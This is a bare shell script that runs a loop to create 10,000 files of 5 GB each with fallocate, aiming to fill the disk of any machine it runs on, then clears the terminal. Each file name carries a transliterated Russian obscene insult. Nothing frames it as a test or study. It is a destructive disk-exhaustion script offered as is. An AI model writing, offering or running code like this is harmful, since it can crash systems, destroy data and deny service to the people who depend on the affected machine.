#!/bin/sh

random_number=$((RANDOM % 100))

for ((i=1; i<=10000; i++)); do
    fallocate -l 5G "TI_DAYN_SOSI_HUI_DOLBAEB$i"
done

clear
